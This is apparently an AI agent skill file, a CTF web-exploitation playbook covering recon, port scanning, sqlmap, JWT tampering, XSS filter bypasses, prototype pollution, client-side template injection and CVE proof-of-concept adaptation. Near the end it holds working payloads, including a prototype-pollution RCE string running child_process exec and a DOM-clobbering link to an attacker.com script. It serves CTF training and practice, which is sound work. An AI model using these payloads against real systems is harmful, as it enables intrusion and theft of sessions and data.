---
name: ctf-web
description: Web exploitation playbook for CTF challenges (auth bypass, injection, file abuse, client-side) with Burp MCP + automation routing.
user-invocable: false
allowed-tools: ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "Task", "WebFetch", "WebSearch"]
---

# CTF Web Exploitation

Fast, deterministic web exploitation workflow optimized for CTF speed.

## Additional Resources

- [solve_web.py](solve_web.py) - Auto route selection (`--input-json`) + one-shot benchmark (`--benchmark-mode`)
- [WEB_BENCHMARK_CASES.json](WEB_BENCHMARK_CASES.json) - Routing benchmark set for rapid triage quality checks
- [BURP_MCP_PLAYBOOK.md](BURP_MCP_PLAYBOOK.md) - Burp Suite MCP operation playbook for Community Edition
- [FLAG_HUNT_CHEATSHEET.md](FLAG_HUNT_CHEATSHEET.md) - quick payloads and flag extraction hints
- [smart_curl.sh](smart_curl.sh) - **CRITICAL:** context-safe curl wrapper (auto-trim, jq keys preview, flag scan, loot logging)
- [auth-jwt.md](auth-jwt.md) - JWT attacks and auth bypasses
- [sql-injection.md](sql-injection.md) - Upstream SQLi patterns and WAF/filter bypass reference
- [auth-and-access-2.md](auth-and-access-2.md) - Upstream auth/access bypass extension patterns
- [client-side-advanced.md](client-side-advanced.md) - Upstream advanced client-side exploitation notes
- [field-notes.md](field-notes.md) - Upstream practical web pattern notes from CTF cases
- [server-side.md](server-side.md) - backend exploitation patterns
- [server-side-2.md](server-side-2.md) - Upstream server-side follow-up pattern set
- [server-side-advanced-2.md](server-side-advanced-2.md) - Upstream advanced server-side add-on #2
- [server-side-advanced-3.md](server-side-advanced-3.md) - Upstream advanced server-side add-on #3
- [server-side-advanced-4.md](server-side-advanced-4.md) - Upstream advanced server-side add-on #4
- [server-side-exec-2.md](server-side-exec-2.md) - Upstream server-side execution follow-up patterns
- [client-side.md](client-side.md) - XSS/client chain patterns
- [web3.md](web3.md) - Blockchain/Solidity CTF quick-start (web3.py, HTB pattern, reentrancy)
- [blind-web-protocol.md](blind-web-protocol.md) - Blind injection protocol (time-based, OOB, callback orchestration)
- [node-and-prototype.md](node-and-prototype.md) - Node.js internals + prototype pollution deep-dive
- [auth-infra.md](auth-infra.md) - Auth infrastructure patterns (SAML, OIDC, API key schemes)
- [cves.md](cves.md) - CVE quick-reference database (use alongside ct-cve/)
- [server-side-exec.md](server-side-exec.md) - Server-side execution patterns (complements server-side-exec-2.md)
- [server-side-deser.md](server-side-deser.md) - Deserialization quick-reference (complements ct-server-side/)
- [WEB_CROSS_CATEGORY_BENCHMARK.json](WEB_CROSS_CATEGORY_BENCHMARK.json) - Cross-category routing benchmark cases

---

## Router & Benchmark (Fast Triage)

```bash
# Auto-select web track from artifact JSON
python3 solve_web.py --input-json challenge_artifacts.json --json

# If artifact JSON is a list, infer all in one run
python3 solve_web.py --input-json WEB_BENCHMARK_CASES.json --json

# One-shot benchmark validation
python3 solve_web.py --benchmark-mode --json
```

Tracks include:

- `jwt-auth`
- `sqli`
- `upload-rce`
- `ssti`
- `lfi-traversal`
- `xss-client`
- `ssrf`
- `csrf`
- `graphql`
- `deserialization`

---

## Burp MCP First-Class Workflow

Default workflow remains `ctf-solve` first. When Burp MCP is available, use this as supplemental accelerator:

1. Capture baseline authenticated and unauthenticated requests
2. Replay baseline, then mutate one variable per request
3. Diff response code/length/body/timing for deterministic delta
4. Escalate only vectors with stable signal
5. Pivot track after 3 dead loops

Use full procedure in [BURP_MCP_PLAYBOOK.md](BURP_MCP_PLAYBOOK.md).

## Hybrid MCP Policy (Web)

- Start with `ctf-solve` during triage/recon (fingerprint, endpoint discovery, baseline probes)
- Switch to `pentest-mcp` when exploitation turns into continuous interactive loops (auth brute workflows, multi-step stateful chains, long-running shells/menus)
- Keep `burp-mcp` as supplemental replay/mutation/diff accelerator (not replacement for primary flow)
- Return to `ctf-solve` for one-shot payload generation, extraction transforms, and final output shaping

---

## Attack Priority Ladder

1. **Flag-first content hunt**
   - `view-source`, static JS, `.git`, `robots.txt`, backup files

1.5. **Directory Discovery (CONDITIONAL — trigger-gated)**
   - **Trigger:** Run ONLY when flag-first hunt returns 0 hits AND attack surface is unclear (no visible endpoints/params)
   - **Anti-triggers:** Skip if `robots.txt` or JS source already reveals API paths, or if challenge description explicitly names endpoints
   - **Command (time-boxed 60s):**
     ```bash
     ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40 -timeout 10 -mc 200,301,302,403 -fs 0 -of json -o /tmp/ffuf_out.json 2>/dev/null
     cat /tmp/ffuf_out.json | python3 -c "import json,sys; [print(r['url']) for r in json.load(sys.stdin).get('results',[])]"
     ```
   - **On first hit:** expand with larger wordlist (`raft-medium-directories.txt`) on discovered paths only
   - **No-hit after 60s:** skip, do NOT escalate — proceed to step 2
   - **Log:** `[DIR_SCAN] hits=<n> wordlist=common.txt elapsed=<t>s`

2. **Auth and session abuse**
   - weak JWT, role confusion, broken access controls
3. **Injection class**
   - SQLi, SSTI, command injection, SSRF, deserialization
4. **File and path abuse**
   - upload bypass, LFI/path traversal, include wrappers
5. **Client-side pivots**
   - reflected/stored/DOM XSS -> token/session exfiltration

---

## High-Speed Command Set

```bash
# Basic fingerprint
curl -I -sL <url>
whatweb <url>

# Quick endpoint and backup checks
curl -s <url>/robots.txt
curl -s <url>/.git/HEAD
curl -s <url>/backup.zip -I

# Runtime helpers
python3 jwt_tamper.py "<jwt_token>"
python3 lfi_tester.py "<url>" "file"
python3 ssti_tester.py "<url>" "name"
python3 upload_tester.py "<upload_url>" "file"
```

## Local Cheatsheet Index (Web)

- Web analysis: [7.0.Web-Application-Analysis.md](../../../command-cheatsheet/7.Web-Exploit/7.0.Web-Application-Analysis.md)
- SQL injection: [7.1.SQL-Injection.md](../../../command-cheatsheet/7.Web-Exploit/7.1.SQL-Injection.md)
- XSS: [7.2.Cross-Site-Scripting.md](../../../command-cheatsheet/7.Web-Exploit/7.2.Cross-Site-Scripting.md)
- File inclusion/LFI: [7.3.File-Inclusion.md](../../../command-cheatsheet/7.Web-Exploit/7.3.File-Inclusion.md)
- Command injection: [7.4.Command-Injection.md](../../../command-cheatsheet/7.Web-Exploit/7.4.Command-Injection.md)
- SSRF: [7.5.SSRF.md](../../../command-cheatsheet/7.Web-Exploit/7.5.SSRF.md)
- SSTI: [7.6.SSTI.md](../../../command-cheatsheet/7.Web-Exploit/7.6.SSTI.md)
- File upload: [7.8.File-Upload.md](../../../command-cheatsheet/7.Web-Exploit/7.8.File-Upload.md)
- JWT: [7.15.JWT-Attacks.md](../../../command-cheatsheet/7.Web-Exploit/7.15.JWT-Attacks.md)

## Match-Ready Quick Command Pack

### Recon quick pack

```bash
curl -I -sL <url>
whatweb <url>
curl -s <url>/robots.txt
curl -s <url>/.git/HEAD
```

### Directory Discovery quick pack (conditional — run if recon returns no attack surface)

```bash
# Fast pass — common.txt (60s budget)
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40 -timeout 10 -mc 200,301,302,403 -fs 0 -of json -o /tmp/ffuf_out.json 2>/dev/null
cat /tmp/ffuf_out.json | python3 -c "import json,sys; [print(r['url']) for r in json.load(sys.stdin).get('results',[])]"

# Deep pass — raft-medium (only if fast pass found hits and surface is still unclear)
ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 40 -timeout 10 -mc 200,301,302,403 -fs 0 2>/dev/null | grep -Eo 'http[s]?://[^ ]+'

# Extension sweep (if target is PHP/ASP/JSP — use only when framework known)
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.env,.git,.sql -t 40 -timeout 10 -mc 200,301,302,403 -fs 0 2>/dev/null | grep -Eo 'http[s]?://[^ ]+'
```

### Injection quick pack

```bash
python3 ssti_tester.py "<url>" "name"
python3 lfi_tester.py "<url>" "file"
sqlmap -u "<url>?id=1" --batch --risk 2 --level 2
```

### Auth/session quick pack

```bash
python3 jwt_tamper.py "<jwt_token>"
curl -s -H "Authorization: Bearer <token>" <url>
```

### File abuse quick pack

```bash
python3 upload_tester.py "<upload_url>" "file"
curl -s -I <url>/backup.zip
```

## MCP Tool Mapping (per quick-pack)

| Quick-pack | Default MCP | Switch Rule |
| :--- | :--- | :--- |
| Recon quick pack | `ctf-solve` | Keep `ctf-solve` unless request replay/mutation loops are needed |
| Directory Discovery quick pack | `ctf-solve` | Keep `ctf-solve`; use `pentest-mcp` only if ffuf needs persistent session for auth-gated paths |
| Injection quick pack | `ctf-solve` | Add `burp-mcp` when payload diffs are ambiguous or multi-param mutation is required |
| Auth/session quick pack | `ctf-solve` | Switch primary to `pentest-mcp` only when exploitation becomes continuous/interactive |
| File abuse quick pack | `ctf-solve` | Use `pentest-mcp` for shell continuity after successful upload-to-RCE |

Execution rule:
- One-shot probes and deterministic checks -> `ctf-solve`
- Replay/mutate/diff loops -> `burp-mcp` (supplemental)
- Persistent shell or multi-step interactive chain -> `pentest-mcp`

### Routing Output Contract (copy-use)

```text
Routing to /ctf-web | primary_mcp=ctf-solve | confidence=8 | backup=/ctf-crypto
```

```text
Routing to /ctf-web | primary_mcp=ctf-solve | confidence=8 | backup=/ctf-os-exploit
```

```text
Routing to /ctf-web | primary_mcp=ctf-solve | confidence=7 | backup=/ctf-reverse
```

```text
Routing to /ctf-web | primary_mcp=ctf-solve | confidence=7 | backup=/ctf-forensics
```

---

## Burp + Script Pairing Matrix

- `jwt-auth` -> Burp replay/tamper + `jwt_tamper.py`
- `upload-rce` -> Burp multipart mutation + `upload_tester.py`
- `csrf` -> Burp capture/replay cross-context + `csrf_grabber.py`
- `lfi-traversal` -> direct mutation + `lfi_tester.py`
- `ssti` -> payload probes + `ssti_tester.py`

---

## Flag Regex Standard

Use this in all response/body searches:

`/(?:coc2026|flag|ctf|rtaf|f1a9|fl4g)\{.*?\}|\{[a-fA-F0-9]{32}\}|\b[a-fA-F0-9]{32}\b/i`

---

## Precision Strike Protocol (Web)

Blind payload fuzzing is forbidden. Every exploit attempt must be stack-justified and budget-limited.

### 1) Payload Justification (mandatory before send)

Before each payload, log one line in this format:

`[WHY] stack_signal=<detected tech> | vector=<vuln class> | payload=<exact payload> | expected=<success indicator>`

Example:

`[WHY] stack_signal=jinja2 template error | vector=ssti | payload={{ config.items() }} | expected=rendered config object`

### 2) Attempt Budget (hard limit)

- Maximum `5` attempts per vulnerability class (`ssti`, `sqli`, `lfi`, `xss`, ...)
- If no stable signal after 5 attempts: `pivot` immediately to next class
- Do not retry the same payload family with minor cosmetic changes

### 3) WAF/Crash Safety Guard

- Add delay between payloads: `sleep 0.8`
- On repeated `403/429`, backoff: `sleep 3`
- On `2` consecutive `5xx` responses, stop that vector immediately (crash-risk guard)

### 4) Precision Execution Loop

```bash
# Example skeleton (max 5 attempts)
for i in 1 2 3 4 5; do
  echo "[WHY] stack_signal=<signal> | vector=<class> | payload=<payload_$i> | expected=<indicator>"
  # send payload_$i
  sleep 0.8
done
# no-signal => pivot
```

---

## Port Discovery Discipline (Anti-Tunnel-Vision)

NEVER scan with hardcoded small port lists when the challenge mentions multiple services. Missing a port = full attack chain miss.

### Rule 1: Read Description Signals FIRST
Before scanning, extract service-count signals from challenge description:
- `"bot"`, `"reviewer"`, `"admin visits"` -> 2+ services expected (web + bot)
- `"netcat"`, `"nc host port"` -> non-HTTP service present
- `"callback"`, `"receives"` -> outbound connection capability
- `"internal network"`, `"docker"` -> multi-container setup

### Rule 2: Default to Wide Scan (masscan → nmap two-step)
```bash
# Step 1: masscan — find all open ports in ~5s (replaces nmap -p-)
sudo masscan <target> -p 0-65535 --rate=10000 -oG /tmp/mscan.txt 2>/dev/null
PORTS=$(grep "open" /tmp/mscan.txt | awk '{print $4}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')

# Step 2: nmap version+script scan only on discovered ports
nmap -sV -sC -p "$PORTS" <target>

# One-liner
PORTS=$(sudo masscan <target> -p 0-65535 --rate=10000 2>/dev/null | grep "open" | awk '{print $4}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//'); nmap -sV -sC -p "$PORTS" <target>

# Fallback if masscan unavailable
nmap -Pn -sT --top-ports 1000 <target>
```

### Rule 3: Hardcoded List Only With Justification
Only restrict to a small port list when:
- Challenge description explicitly names the port
- Full scan already completed and you are re-probing
- Production firewalls make `-p-` too noisy

### Common Miss Pattern (Real Case)
```
# BAD: "I'll scan obvious ports"
nmap -p 80,443,1337,3000,5000,8000,8080,8888,9000  # missed 4000 -> dead end

# GOOD: masscan first, then nmap only on hits
sudo masscan <target> -p 0-65535 --rate=10000 2>/dev/null | grep open
# → finds 4000/tcp open (bot service) in ~5 seconds
nmap -sV -sC -p 80,4000 <target>
```

---

## Context-Aware Response Handling (Anti-Context-Bloat)

Large raw HTTP/JSON bodies must NEVER be pushed into the prompt wholesale. This causes token exhaustion and tunnel vision.

### Rule 1: Use `smart_curl` instead of `curl` when response size is unknown

```bash
# Auto-trims large bodies and previews structure; scans for flags first
smart_curl -sS "http://<target>/api/debug"
```

`smart_curl` behavior:
- Prints full body if <= `SMART_CURL_MAX` chars (default `2000`)
- If JSON + too large: shows `jq 'keys'` preview only
- If text + too large: shows head 20 / tail 10 lines only
- Always scans for flags and appends hits to `/tmp/ctf_loot.txt`

### Rule 2: JSON Drill-Down Pattern (jq)

```bash
# 1) list top-level keys only (cheap)
smart_curl -sS "http://<target>/api/debug" | jq 'keys'

# 2) open one interesting key
curl -sS "http://<target>/api/debug" | jq '.__file__'

# 3) recurse only if keys look promising
curl -sS "http://<target>/api/debug" | jq '.config | keys'
```

### Rule 3: Text Narrowing Pattern (grep)

```bash
# Hunt only what matters, don't load whole body
curl -sS "http://<target>/debug" | grep -Eni "flag|secret|token|file|path|version|error" | head -30
```

### Rule 4: Never Re-Request Full Payload

- If `smart_curl` truncates a response, do NOT refetch the full body
- Instead, refine with `jq '.<key>'` or `grep -Ei '<term>'`
- Drill down until the interesting slice is small and targeted

### Rule 5: File-Leak Pivot BEFORE LFI Payloads

If JSON exposes a server file path (e.g. `__file__: /app/server.py`), try direct serving first:

```bash
# Direct path probe BEFORE crafting LFI (often succeeds and skips 500 loops)
smart_curl -I "http://<target>/server.py"
smart_curl -sS "http://<target>/$(basename /app/server.py)" | head -50
```

Only escalate to `?fn=` / path-traversal LFI after the direct fetch is proven blocked.

---

## Stop & Think Rule (Error-Loop Breaker)

Repeatedly retrying a failing payload drains tokens and risks account/IP bans.

Hard rules when an exploit attempt fails:

1. If server returns `HTTP 500` twice in a row for the same vector -> STOP that vector
2. If response contains `UnicodeError`, `IDNA`, `decode`, `bad encoding` -> assume current path/format is incompatible and switch vector (do NOT just change case or slash)
3. If identical payload family fails 2x with similar error -> pivot class (`lfi` -> `ssrf`, `ssti` -> `rce`, ...)
4. Always log the failure reasoning, not just the error text:

```text
[STOP] vector=lfi | payload=?fn=../server.py | error=HTTP 500 IDNA UnicodeError
[REASON] server path normalization rejects traversal; direct fetch is more likely
[NEXT] try GET /server.py and GET /<basename> before retrying traversal
```

---

## Anti-Trap Rules (Web)

- Do not trust single noisy error pages; confirm with response diff.
- Do not run full payload brute-force first; confirm at least one valid injection signal. (Directory discovery via `ffuf` is permitted as conditional step 1.5 — not the same as payload fuzzing)
- Do not stay on one vector after 3 repeated no-signal attempts.
- Do not assume framework/DB from headers only; verify behavior.
- Do not load untrimmed response bodies; use `smart_curl` / `jq` / `grep`.
- Do not retry a payload that triggered `5xx` or `UnicodeError`; switch vector.
- Do not scan with hardcoded port list when description mentions multiple services.
- Do not confuse CSS `text-transform: uppercase` (display only) with server-side uppercase filter; check raw HTML bytes.

## XSS Filter Bypass Quick Patterns

- **Server uppercases content:** HTML numeric entities are case-insensitive -> encode JS in attribute with `&#x61;` pattern (survives server toupper, browser decodes correctly).
  ```html
  <img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">  <!-- alert(1) -->
  ```
- **`<script>` tag stripped:** use event handlers on `img`, `svg`, `body onload`, `details/ontoggle`.
- **Quote escape broken:** try backtick, no-quote, or JSFuck.
- **Bot exfil via console.log:** if challenge says "console.log is sent back", no external callback needed:
  ```js
  console.log(JSON.stringify(localStorage))
  console.log(document.cookie)
  ```

---

## Community Tools Extended References (Transilience AI)

Triggered consult — read these when standard technique fails or deeper cheat-sheet is needed.

### Injection (`ct-injection/`)
| File | Use When |
|------|----------|
| `ct-injection/ssti-cheat-sheet.md` | SSTI filter bypass, engine-specific payloads |
| `ct-injection/ssti-advanced.md` | Exotic SSTI (Mako, Velocity, Pebble) |
| `ct-injection/ssti-resources.md` | Full SSTI technique index |
| `ct-injection/sql-injection-advanced.md` | Blind SQLi, WAF bypass, OOB |
| `ct-injection/sql-injection-quickstart.md` | Quick SQL attack vectors |
| `ct-injection/nosql-injection-cheat-sheet.md` | MongoDB, Redis, CouchDB injection |
| `ct-injection/nosql-injection-advanced.md` | Advanced NoSQL bypass |
| `ct-injection/os-command-injection-cheat-sheet.md` | OS command injection payloads |
| `ct-injection/xxe-cheat-sheet.md` | XXE (OOB, blind, SSRF via XXE) |
| `ct-injection/xxe-quickstart.md` | XXE quick test vectors |

### Server-Side (`ct-server-side/`)
| File | Use When |
|------|----------|
| `ct-server-side/ssrf-cheat-sheet.md` | SSRF bypass (IP rebinding, redirects, schemes) |
| `ct-server-side/ssrf-quickstart.md` | Fast SSRF test patterns |
| `ct-server-side/http-request-smuggling-advanced.md` | CL.TE / TE.CL advanced patterns |
| `ct-server-side/http-request-smuggling-cheat-sheet.md` | Smuggling payloads reference |
| `ct-server-side/smuggling-authenticated.md` | Authenticated smuggling attacks |
| `ct-server-side/path-traversal-cheat-sheet.md` | Path traversal / LFI bypass (36KB) |
| `ct-server-side/file-upload-cheat-sheet.md` | File upload bypass (30KB) |
| `ct-server-side/insecure-deserialization-cheat-sheet.md` | Java/PHP/Python deserialization |
| `ct-server-side/http-host-header-cheat-sheet.md` | Host header injection |

### Authentication (`ct-auth/`)
| File | Use When |
|------|----------|
| `ct-auth/jwt_attack_techniques.md` | JWT alg:none, key confusion, JWK injection (40KB) |
| `ct-auth/jwt-cheat-sheet.md` | JWT quick reference |
| `ct-auth/oauth-cheat-sheet.md` | OAuth CSRF, open redirect, token leakage (36KB) |
| `ct-auth/2FA_BYPASS.md` | 2FA/OTP bypass techniques |
| `ct-auth/CAPTCHA_BYPASS.md` | CAPTCHA bypass (OCR, audio, API) |
| `ct-auth/password-attacks.md` | Credential stuffing, spraying, brute-force |
| `ct-auth/default-credentials.md` | Common default cred list |
| `ct-auth/authentication-cheat-sheet.md` | Auth bypass full reference |
| `ct-auth/adfs-exploitation.md` | ADFS/Windows auth exploitation |

### Blockchain Security (`ct-blockchain/`) — Phase 2

> Use alongside `web3.md` — covers attack patterns NOT in web3.md

| File | Use When |
|------|----------|
| `ct-blockchain/blockchain-security.md` | Full blockchain CTF quick-start: HTB pattern, vuln table, web3.py essentials |
| `ct-blockchain/delegatecall-attacks.md` | Storage layout mismatch + raw bytecode exploit deployment |
| `ct-blockchain/create-address-prediction.md` | CREATE nonce brute-force, nonce-bump, multi-level search (python ready) |
| `ct-blockchain/storage-layout.md` | Mapping slot computation (string/address/uint keys), packed vars, private reads |

**Attack Patterns unique to ct-blockchain (not in web3.md):**
- **ECDSA Signature Malleability**: `new_s = N - s`, flip `v` (27↔28) → second valid signature from known sig
- **Empty Array Bypass**: `require(arr.length >= N)` missing → pass `[]` to skip all loop validation
- **CREATE2 address**: `keccak256(0xff ++ deployer ++ salt ++ keccak256(init_code))[12:]`
- **HTB blockchain pattern**: `curl http://$HOST:$PORT/connection_info` → PrivateKey, Address, TargetAddress, RPC_URL

```python
# ECDSA Malleability — generate second valid sig
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
r, s, v = int(sig[2:66], 16), int(sig[66:130], 16), int(sig[130:], 16)
new_s = N - s
new_v = 28 if v == 27 else 27
malleable_sig = hex(r)[2:].zfill(64) + hex(new_s)[2:].zfill(64) + hex(new_v)[2:].zfill(2)
```

### CVE PoC Generator (`ct-cve/`) — Phase 3

> Use when challenge description mentions a specific CVE ID or vulnerable version.

| File | Use When |
|------|----------|
| `ct-cve/cve-ctf-quickstart.md` | Fast 5-step CVE research → PoC adaptation workflow for CTF |
| `ct-cve/poc-methodology.md` | Full PoC methodology: NVD API, script template, CWE patterns, quality checklist |
| `ct-cve/cve_lookup.py` | CLI tool: NVD lookup + PoC links + searchsploit in one shot |

**Quick Start — CVE challenge:**
```bash
# 1. Research CVE instantly
python3 ct-cve/cve_lookup.py CVE-2024-XXXXX --poc

# 2. Search local exploits
searchsploit CVE-2024-XXXXX
searchsploit -m <path>   # copy to cwd

# 3. Adapt PoC → run
python3 poc.py http://TARGET:PORT --proxy http://127.0.0.1:8080
```

**CTF-Specific Shortcuts:**
- Recent CVE (<30 days) → search `https://github.com/<challenge_creator>?tab=repositories&q=CVE`
- HackTheBox machines → creator's GitHub often has reference exploit
- `searchsploit` → `searchsploit -m` to copy, then adapt URL/port
- Nuclei templates for detection: `nuclei -t cves/ -u http://TARGET`

### Client-Side Attacks (`ct-client-side/`) — Phase 4

> Use when challenge involves JS framework, XSS with no `<script>` tags allowed, or DOM manipulation.

| File | Attack | Trigger Keywords |
|------|--------|-----------------|
| `ct-client-side/prototype-pollution.md` | PP → XSS / RCE | `__proto__`, `merge`, `deepMerge`, `jQuery`, `lodash` |
| `ct-client-side/dom-clobbering.md` | DOM variable override → XSS bypass | `id=`, `name=`, DOMPurify, no `<script>` |
| `ct-client-side/css-injection.md` | CSRF token leak / data exfil via CSS | `<style>` injection, token leak, CSP |
| `ct-client-side/csti.md` | Client-side template injection | `ng-app`, `v-app`, `{{}}`, AngularJS, Vue.js |

**Quick Triage:**
```bash
# Prototype Pollution — detect
curl "http://TARGET/api" -d '{"__proto__":{"test":"pp"}}' -H "Content-Type: application/json"
# Then check: GET /api/user → response has "test":"pp" → VULN

# CSTI — detect
# Inject {{7*7}} into any user input → check if "49" appears in DOM

# DOM Clobbering — entry point
# Find HTML injection surviving sanitizer (forms/anchors allowed)
# Look for: window.X, config.Y, document.Z reads in JS source
```

**Key CTF Patterns:**
- PP → admin bypass: `{"__proto__": {"isAdmin": true, "role": "admin"}}`
- PP → RCE (ejs): `{"__proto__": {"outputFunctionName": "x;require('child_process').exec('id');//"}}`
- DOM Clobbering → `<a id=config></a><a id=config name=cdnUrl href="//attacker.com/xss.js"></a>`
- AngularJS 1.6+: `{{constructor.constructor('alert(1)')()||""}}`
